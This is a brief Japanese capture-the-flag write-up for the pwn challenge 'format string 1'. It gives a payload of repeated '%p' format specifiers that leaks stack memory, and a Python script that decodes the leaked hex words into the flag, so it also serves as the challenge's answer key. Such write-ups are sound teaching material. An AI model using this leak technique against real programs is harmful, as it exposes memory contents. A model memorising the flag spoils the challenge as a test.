---
title: "format string 1"
points: 100
tags: ["pwn"]
---

FSBがあり、スタックにある値を読みだせればいいだけなので以下のような値をぶん投げる。

`%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p`

出てきたものをasciiに直していく

```python
flags = [
  "7b4654436f636970",
  "355f31346d316e34",
  "3478345f33317937",
  "35365f673431665f",
  "7d313464303935",
]

for flag in flags:
    a = bytearray.fromhex(flag)
    a.reverse()
    print(a.decode(), end='')
```